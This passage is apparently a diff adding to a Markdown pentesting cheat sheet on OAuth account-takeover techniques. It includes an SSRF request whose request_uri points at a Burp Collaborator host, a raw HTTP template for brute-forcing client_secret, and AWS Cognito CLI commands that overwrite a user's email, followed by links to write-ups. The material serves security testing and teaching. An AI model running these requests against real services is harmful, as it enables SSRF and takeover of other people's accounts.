+- **request_uris** - An array of the **allowed request_uris for this client**. The "request_uri" parameter may be supported on the authorization endpoint to provide a URL that contains a JWT with the request information (see https://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2).Even if dynamic client registration is not enabled, or it requires authentication, we can try to perform SSRF on the authorization endpoint simply by using "request_uri":\`GET /authorize?response_type=code%20id_token&client_id=sclient1&request_uri=https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt`Note: do not confuse this parameter with "redirect_uri". The "redirect_uri" is used for redirection after authorization, whereas **"request_uri" is fetched by the server at the start of the authorization process**.At the same time, many servers we've seen do not allow arbitrary "request_uri" values: they only allow whitelisted URLs that were pre-registered during the client registration process. That's why we need to supply "request_uris": "https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt" beforehand.
+
+[Hidden OAuth attack vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)
+
+## Client Secret Bruteforce
+
+- You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.
+The request to BF may look similar to:
+
+```jsx
+POST /token HTTP/1.1
+content-type: application/x-www-form-urlencoded
+host: 10.10.10.10:3000
+content-length: 135
+Connection: close
+
+code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
+```
+
+## Referer Header leaking Code + State
+
+- Once the client has the **code and state**, if it's **reflected inside the Referer header** when he browses to a different page, then it's vulnerable
+
+## Access Token Stored in Browser History
+
+- Go to the **browser history and check if the access token is saved in there**.
+
+### Authorization/Refresh Token not bound to client
+
+- If you can get the **authorization code and use it with a different client then you can takeover other accounts**.
+
+### **Leaked OAuth client ID and client secret**
+
+[Forging OAuth tokens using discovered client id and client secret](https://basyounii.medium.com/forging-oauth-tokens-using-discovered-client-id-and-client-secret-d224e4e7892a)
+
+## AWS Cognito
+
+In this bug bounty report: `[**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/)` you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
+
+```jsx
+# Read info of the user
+aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]
+
+# Change email address
+aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
+{
+    "CodeDeliveryDetailsList": [
+        {
+            "Destination": "i***@f***.com",
+            "DeliveryMedium": "EMAIL",
+            "AttributeName": "email"
+        }
+    ]
+}
+```
+
+### Reports/Write-ups/Articles
+
+[Developers and Hackers, Understand OAuth and it's grant type (2022 Guide)](https://payatu.com/blog/anubhav.singh/oauth-grant-types)
+
+[OAuth grant types | Web Security Academy](https://portswigger.net/web-security/oauth/grant-types)
+
+https://twitter.com/harshbothra_/status/1521474668728700933?s=20&t=O-e_ACWHIizJqKzGbL9tHw
+
+https://www.youtube.com/watch?v=0T8WG2liEC0
+
+https://www.youtube.com/watch?v=ZOwwA07x6Iw
+
+[Internet Bug Bounty disclosed on HackerOne: Race Conditions in...](https://hackerone.com/reports/55140)
+
+→Race condition in OAuth2.0
+
+[The Wondeful World of OAuth: Bug Bounty Edition](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
+
+[hackerone-reports/TOPOAUTH.md at master · reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPOAUTH.md)
+
+→Top OAuth reports
+
+[Exploiting OAuth: Journey to Account Takeover](https://blog.dixitaditya.com/oauth-account-takeover)
+
+[OAuth to Account takeover](https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover)
+
+[High-Severity Bug Reported in Google's OAuth Client Library for Java](https://thehackernews.com/2022/05/high-severity-bug-reported-in-googles.html)
+
+[Account hijacking using "dirty dancing" in sign-in OAuth-flows - Detectify Labs](https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/)
+
+[](https://infosecwriteups.com/oauth-misconfiguration-leads-to-pre-account-takeover-8f94c1ef50be](https://infosecwriteups.com/oauth-misconfiguration-leads-to-pre-account-takeover-8f94c1ef50be))
+
+https://www.youtube.com/watch?v=LMgpuVKslw8
+
+### Burpsuite’s extension
+
+[GitHub - PortSwigger/oauth-scan: Burp Suite Extension useful to verify OAUTHv2 and OpenID security](https://github.com/PortSwigger/oauth-scan)
